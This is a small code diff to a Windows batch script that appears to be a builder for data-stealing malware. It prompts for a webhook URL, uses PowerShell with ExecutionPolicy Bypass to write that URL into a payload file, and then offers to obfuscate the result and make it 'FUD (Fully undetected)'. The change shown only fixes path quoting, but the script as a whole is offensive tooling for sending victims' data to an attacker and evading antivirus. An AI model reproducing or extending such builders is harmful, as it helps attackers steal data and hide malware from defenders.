@@ -21,7 +21,7 @@ set /p url="URL: "
 
 set "batch_path=%~dp0\main.%file%"
 
-powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Get-Content %batch_path%) -replace 'YOUR_WEBHOOK_HERE', '%url%' | Set-Content %batch_path%"
+powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Get-Content '%batch_path%') -replace 'YOUR_WEBHOOK_HERE', '%url%' | Set-Content '%batch_path%'"
 
 echo Would you like to obfuscate and make it FUD (Fully undetected)? (y/n)
 choice /C yn /M "Select an option:" /N
